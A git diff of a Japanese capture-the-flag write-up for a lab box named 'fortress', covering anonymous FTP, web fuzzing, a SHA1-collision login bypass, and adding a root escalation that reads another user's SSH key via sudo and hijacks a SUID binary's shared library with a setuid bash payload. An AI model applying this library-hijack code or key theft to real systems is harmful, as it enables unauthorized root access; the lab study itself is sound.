@@ -65,7 +65,7 @@ PORT     STATE SERVICE VERSION
 
 ### FTP
 
-anonymousで2ファイル取得。
+anonymous で 2 ファイル取得。
 
 ```sh
 $ ftp $TARGET -p 5581
@@ -73,7 +73,7 @@ Connected to 10.10.202.145.
 220 (vsFTPd 3.0.3)
 Name (10.10.202.145:kali): anonymous
 331 Please specify the password.
-Password: 
+Password:
 230 Login successful.
 Remote system type is UNIX.
 Using binary mode to transfer files.
@@ -87,13 +87,14 @@ drwxr-xr-x    2 ftp      ftp          4096 Jul 25  2021 ..
 ```
 
 ```sh
-$ cat marked.txt 
+$ cat marked.txt
 If youre reading this, then know you too have been marked by the overlords... Help memkdir /home/veekay/ftp I have been stuck inside this prison for days no light, no escape... Just darkness... Find the backdoor and retrieve the key to the map... Arghhh, theyre coming... HELLLPPPPPmkdir /home/veekay/ftp
 ```
 
-.file は、コンパイルされたPythonファイル。
+.file は、コンパイルされた Python ファイル。
+
 ```sh
-$ file .file         
+$ file .file
 .file: python 2.7 byte-compiled
 ```
 
@@ -120,7 +121,7 @@ def secret():
         return reveal
 
 while True:
-    
+
     try:
         (conn, addr) = s.accept()
         conn.send('\n\tChapter 1: A Call for help\n\n')
@@ -142,7 +143,7 @@ while True:
     continue
 ```
 
-5752ポートが何であるか判明した。
+5752 ポートが何であるか判明した。
 
 usern, passw を hex2ascii すると、ユーザー名とパスワードになる。
 
@@ -158,7 +159,7 @@ Password: [REDACTED]
 
 ### サブドメイン
 
-サブドメインは検出できなかったが、templeサブドメインもただのApache初期ページで検出できなかったので、絶対に存在しないとは言い切れない。
+サブドメインは検出できなかったが、temple サブドメインもただの Apache 初期ページで検出できなかったので、絶対に存在しないとは言い切れない。
 
 ```shell
 $ ffuf -u http://fortress:7331 -c -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H 'Host: FUZZ.fortress' -fs 10918
@@ -178,7 +179,7 @@ gobuster dir -x=txt,php -u http://fortress:7331 -w ./dirlist.txt -t 30 -k
 ```
 
 private.php を発見。  
-templeサブドメインでも同じ結果になった。
+temple サブドメインでも同じ結果になった。
 
 private.php のパラメータとして先ほど入手したシークレットを渡すファジングをしたが、ヒットしなかった。
 
@@ -208,20 +209,19 @@ temple.fortress サブドメインに対して同じファジングを実行し�
 
 ```html
 <html>
-<head>
-	<title>Chapter 2</title>
-	<link rel='stylesheet' href='assets/style.css' type='text/css'>
-</head>
-<body>
-	<div id="container">
-        <video width=100% height=100% autoplay>
-            <source src="./assets/flag_hint.mp4" type=video/mp4>
-        </video>
+  <head>
+    <title>Chapter 2</title>
+    <link rel="stylesheet" href="assets/style.css" type="text/css" />
+  </head>
+  <body>
+    <div id="container">
+      <video width="100%" height="100%" autoplay>
+        <source src="./assets/flag_hint.mp4" type=video/mp4>
+      </video>
 
+      <!-- Hmm are we there yet?? May be we just need to connect the dots -->
 
-<!-- Hmm are we there yet?? May be we just need to connect the dots -->
-
-<!--    <center>
+      <!--    <center>
 			<form id="login" method="GET">
 				<input type="text" required name="user" placeholder="Username"/><br/>
 				<input type="text" required name="pass" placeholder="Password" /><br/>
@@ -229,16 +229,14 @@ temple.fortress サブドメインに対して同じファジングを実行し�
 			</form>
 		</center>
 -->
-
     </div>
-
-</body>
+  </body>
 </html>
 ```
 
 Sonic Visualiser で mp4 のスペクトルを確認したが、文字らしきものは出なかった。
 
-同じPHPに、`?user=admin&pass=abc`というパラメータを付けてGETしたら、`Nah, babe that ain't gonna work` という表示が増えた。
+同じ PHP に、`?user=admin&pass=abc`というパラメータを付けて GET したら、`Nah, babe that ain't gonna work` という表示が増えた。
 
 /assets/style.css にも下記ヒントが含まれている。
 
@@ -256,31 +254,28 @@ Sonic Visualiser で mp4 のスペクトルを確認したが、文字らしき�
 This is journey of the great monks, making this fortress a sacred world, defending the very own of their kinds, from what it is to be unleashed... The only one who could solve their riddle will be granted a KEY to enter the fortress world. Retrieve the key by COLLIDING those guards against each other.
 ```
 
-PHPに指定する user, pass パラメータを特定する必要がある。  
+PHP に指定する user, pass パラメータを特定する必要がある。  
 文脈的に、user は `veekay` の可能性がある。
 
 全く分からずウォークスルーをチラ見した。
 
-答え：拡張子をhtmlにする
+答え：拡張子を html にする
 
 ```html
 <html>
-<head>
-	<title>Chapter 2</title>
-	<link rel='stylesheet' href='assets/style.css' type='text/css'>
-</head>
-<body>
-	<div id="container">
-        <center><h1>
-        	The Temple of Sins
-        </h1></center>
+  <head>
+    <title>Chapter 2</title>
+    <link rel="stylesheet" href="assets/style.css" type="text/css" />
+  </head>
+  <body>
+    <div id="container">
+      <center><h1>The Temple of Sins</h1></center>
 
-        <center>
-            <img src="./assets/guardians.png" width="700px" height="400px">
-        </center>
+      <center>
+        <img src="./assets/guardians.png" width="700px" height="400px" />
+      </center>
 
-
-<!--
+      <!--
 <?php
 require 'private.php';
 $badchar = '000000';
@@ -315,35 +310,44 @@ if (isset($_GET['user']) and isset($_GET['pass'])) {
 ?>
 -->
 
-<!-- Don't believe what you see... This is not the actual door to the temple. -->
-	    <center>
-			<form id="login" method="GET">
-				<input type="text" required name="user" placeholder="Username"/><br/>
-				<input type="text" required name="pass" placeholder="Password" /><br/>
-				<input type="submit"/>
-			</form>
-		</center>
-
+      <!-- Don't believe what you see... This is not the actual door to the temple. -->
+      <center>
+        <form id="login" method="GET">
+          <input
+            type="text"
+            required
+            name="user"
+            placeholder="Username"
+          /><br />
+          <input
+            type="text"
+            required
+            name="pass"
+            placeholder="Password"
+          /><br />
+          <input type="submit" />
+        </form>
+      </center>
     </div>
-
-</body>
+  </body>
 </html>
 ```
 
-PHPの実装が判明。
-- test1 と test2 のsha1ハッシュを比較し一致が必要
+PHP の実装が判明。
+
+- test1 と test2 の sha1 ハッシュを比較し一致が必要
 - test1 と test2 は異なる文字列
-- test2 の文字列長は、501以上である必要
+- test2 の文字列長は、501 以上である必要
 
-http://73spica.tech/blog/sha1-collision/ でSHA1衝突について学ぶ。
+http://73spica.tech/blog/sha1-collision/ で SHA1 衝突について学ぶ。
 
-- 2017年、異なる２つのPDFで同じSHA1ハッシュになるパターンをGoogleが発表した。
-- 先頭320バイトの部分で衝突が発生し、それ以降は同じハッシュ値になる。
+- 2017 年、異なる２つの PDF で同じ SHA1 ハッシュになるパターンを Google が発表した。
+- 先頭 320 バイトの部分で衝突が発生し、それ以降は同じハッシュ値になる。
 
-つまり、その2つのPDFファイルの先頭501バイトをそれぞれ切り出してGETパラメータとして送ればよいと思われる。
+つまり、その 2 つの PDF ファイルの先頭 501 バイトをそれぞれ切り出して GET パラメータとして送ればよいと思われる。
 
 ```sh
-$ head -c 501 ./shattered-1.pdf > out-1.pdf  
+$ head -c 501 ./shattered-1.pdf > out-1.pdf
 
 $ head -c 501 ./shattered-2.pdf > out-2.pdf
 ```
@@ -355,13 +359,13 @@ pdf1 = requests.get("http://localhost:8000/out-1.pdf")
 pdf2 = requests.get("http://localhost:8000/out-2.pdf")
 
 params = {'user': pdf1.content, 'pass': pdf2.content}
-r = requests.get("http://fortress:7331/[REDACTED].php/",params=params) 
+r = requests.get("http://fortress:7331/[REDACTED].php/",params=params)
 print (r.text)
 ```
 
 `I feel pitty for you` が返る。shattered-1.pdf は封じられているらしい。
 
-自分で適当に作ったPDFをもとに [sha1collider](https://github.com/nneonneo/sha1collider/tree/master) でSHA1が一致するPDFを作り、同じことをした。
+自分で適当に作った PDF をもとに [sha1collider](https://github.com/nneonneo/sha1collider/tree/master) で SHA1 が一致する PDF を作り、同じことをした。
 
 ```sh
 $ python ./collide.py ../fortress.pdf ../fortress2.pdf
@@ -370,14 +374,14 @@ $ head -c 501 ./out-fortress.pdf > out-1.pdf
 head -c 501 ./out-fortress2.pdf > out-2.pdf
 collider]
 
-$ sha1sum ./*.pdf                                                                      
+$ sha1sum ./*.pdf
 723dd3ea75a0df5134549645a1e3ef9ef16fef1d  ./out-1.pdf
 723dd3ea75a0df5134549645a1e3ef9ef16fef1d  ./out-2.pdf
 ```
 
 それでも `I feel pitty for you` が返った。
 
-https://github.com/cr-marcstevens/hashclash でSHA1文字列を生成することを目指したが、使い方が分からなかった。（MD5なら簡単だったが）
+https://github.com/cr-marcstevens/hashclash で SHA1 文字列を生成することを目指したが、使い方が分からなかった。（MD5 なら簡単だったが）
 
 https://sha-mbles.github.io/ から messageA, messageB をダウンロード。サイズがちょうどいい。
 
@@ -388,20 +392,22 @@ msg1 = requests.get("http://localhost:8000/messageA")
 msg2 = requests.get("http://localhost:8000/messageB")
 
 params = {'user': msg1.content, 'pass': msg2.content}
-r = requests.get("http://fortress:7331/[REDACTED].php/",params=params) 
+r = requests.get("http://fortress:7331/[REDACTED].php/",params=params)
 print (r.text)
 ```
 
 テキストファイル名が返ってきた。
 
 ```html
-<pre>'The guards are in a fight with each other... Quickly retrieve the key and leave the temple: '[REDACTED].txt</pre>
+<pre>
+'The guards are in a fight with each other... Quickly retrieve the key and leave the temple: '[REDACTED].txt</pre
+>
 ```
 
 秘密鍵
 
 ```
-"The Temple guards won't betray us, but I fear of their foolishness that will take them down someday. 
+"The Temple guards won't betray us, but I fear of their foolishness that will take them down someday.
 I am leaving my private key here for you j4x0n. Prepare the fort, before the enemy arrives"
 												- h4rdy
 
@@ -481,7 +487,7 @@ veekay:x:1001:1001::/home/veekay:/bin/bash
 h4rdy:x:1002:1002::/home/h4rdy:/bin/rbash
 ```
 
-そもそもどうやって制限されてるかというと、rbash（制限付きbash）のため。
+そもそもどうやって制限されてるかというと、rbash（制限付き bash）のため。
 
 ```sh
 h4rdy@fortress:~$ echo $0
@@ -541,7 +547,7 @@ h4rdy@fortress:/home/j4x0n$ /bin/cat endgame.txt
 Bwahahaha, you're late my boi!! I have already patched everything... There's nothing you can exploit to gain root... Accept your defeat once and for all, and I shall let you leave alive.
 ```
 
-j4x0n が soファイルのオーナーになっているのは気になる。
+j4x0n が so ファイルのオーナーになっているのは気になる。
 
 ```sh
 h4rdy@fortress:/home/j4x0n$ /usr/bin/find / -user j4x0n -type f -not -path "/proc/*" 2>/dev/null
@@ -558,7 +564,7 @@ h4rdy@fortress:/home/j4x0n$ /bin/ls -al /usr/lib/libfoo.so
 -rwxrwxr-x 1 j4x0n j4x0n 16080 Jul 26  2021 /usr/lib/libfoo.so
 ```
 
-/opt/bt にはrootのSUIDが付いており、j4x0n 所有のsoをリンクしている。
+/opt/bt には root の SUID が付いており、j4x0n 所有の so をリンクしている。
 
 ```sh
 h4rdy@fortress:/home/j4x0n$ /bin/ls -al /opt
@@ -577,76 +583,113 @@ h4rdy@fortress:/home/j4x0n$ /usr/bin/ldd /opt/bt
         /lib64/ld-linux-x86-64.so.2 (0x00007fd0415dc000)
 ```
 
-j4x0n に昇格成功した場合に、これを利用してroot昇格できると思われる。
+j4x0n に昇格成功した場合に、これを利用して root 昇格できると思われる。
+
+フルパス指定が面倒になったので PATH 追加。
+
+```sh
+export PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:$PATH
+```
+
+cat を j4x0n として実行できる。
+
+```sh
+h4rdy@fortress:/home/j4x0n$ sudo -l
+Matching Defaults entries for h4rdy on fortress:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User h4rdy may run the following commands on fortress:
+    (j4x0n) NOPASSWD: /bin/cat
+```
+
+j4x0n の SSH 秘密鍵入手。
+
+```sh
+h4rdy@fortress:/home/j4x0n$ sudo -u j4x0n cat .ssh/id_rsa
+```
 
 ## 権限昇格２
 
+先に見つけていたこの弱点。
+
+```sh
+h4rdy@fortress:/home/j4x0n$ /bin/ls -al /opt
+total 28
+drwxr-xr-x  2 root root  4096 Jul 26  2021 .
+drwxr-xr-x 23 root root  4096 Jul 25  2021 ..
+-rwsrwxr-x  1 root root 16696 Jul 26  2021 bt
+
+h4rdy@fortress:/home/j4x0n$ /usr/bin/file /opt/bt
+/opt/bt: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=cb7bf398a6ca5b7782a85f0afcdd3554d44ca151, for GNU/Linux 3.2.0, not stripped
+
+h4rdy@fortress:/home/j4x0n$ /usr/bin/ldd /opt/bt
+        linux-vdso.so.1 =>  (0x00007ffd7e5ed000)
+        libfoo.so => /usr/lib/libfoo.so (0x00007fd0417ef000)
+        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fd041212000)
+        /lib64/ld-linux-x86-64.so.2 (0x00007fd0415dc000)
+```
+
+so を上書きして bt を実行したら、任意のコードを実行できるはず。
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+static void hijack() __attribute__((constructor));
+
+void hijack() {
+        setgid(0);
+        setuid(0);
+        system("/bin/bash -p");
+}
+```
+
+```c
+gcc -fPIC -shared -o /usr/lib/libfoo.so src.c -nostartfiles
+```
+
+root シェルゲット！
+
+```sh
+j4x0n@fortress:~$ /opt/bt
+To run a command as administrator (user "root"), use "sudo <command>".
+See "man sudo_root" for details.
+
+root@fortress:~# id
+uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare),1000(j4x0n)
+```
+
+```sh
+root@fortress:~# cat /root/root.txt
+3a17.............................
+
+root@fortress:~# cat /root/note.txt
+
+
+Well done!! If you did this box without any help... Without any hints... You did a REAL GREAT JOB!! In that case, I am definitely sure that you have learnt a few things from this small challenge box. As this was the end of Chapter 3: Showdown... The story of fortress conquered by j4x0n and his alliance came to an end.
+
+
+And if you were interested in what happened to j4x0n (aka me) after you took control over the fortress. Tbh, he went insanely furious for this loss... The politics he played, the kingdom he built so far came to a tremendous end. Feeling the hatred, the sorrow he escaped into a dense forest before someone could notice. Not sure, if he is gonna survive the wildery of those jungles... But if he does... Well, m4y th3 l0r6 s4v3 u5 4ll.
+```
 
 ## 振り返り
 
-- 拡張子 php を付けて試す。html も付けて試す。
-- hashclash で SHA1 文字列を生成できるよう使い方の研究が必要。
-- rbash
+- シークレットに拡張子 php を付けること、それが成功した後に、html を付けて試すことは思いつき難かった。拡張子でファジングすればよかった。
+- rbash は初見。少なくとも触ったのは初めて。
+- SHA1 衝突のチャレンジは初見。MD5 なら衝突する文字列を生成できた。ただし、PREFIX を指定できるだけで、大部分はランダムになる。
+- SHA1 は PDF しか生成できなかった。（PDF で可能なのであれば、たぶん方法はあると思う）
 
-## シェル安定化メモ
+### 整理
 
-```shell
-# python が無くても、python3 でいける場合もある
-python3 -c 'import pty; pty.spawn("/bin/bash")'
-export TERM=xterm
+全ての始まりの PDF  
+https://shattered.io/
 
-# Ctrl+Z でバックグラウンドにした後に
-stty raw -echo; fg
+MessageA,B  
+https://sha-mbles.github.io/
 
-#（終了後）エコー無効にして入力非表示になっているので
-reset
+SHA1 が衝突する PDF を簡単に作れる（PDF としての妥当性は不明）  
+https://github.com/nneonneo/sha1collider/tree/master
 
-# まず、他のターミナルを開いて rows, columns の値を調べる
-stty -a
-
-# リバースシェルで rows, cols を設定する
-stty rows 52
-stty cols 236
-
-```
-
-```
------BEGIN OPENSSH PRIVATE KEY-----
-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
------END OPENSSH PRIVATE KEY-----
-```
+MD5 の衝突文字列は作れた。SHA1 のツールが含まれるが使い方不明。  
+https://github.com/cr-marcstevens/hashclash
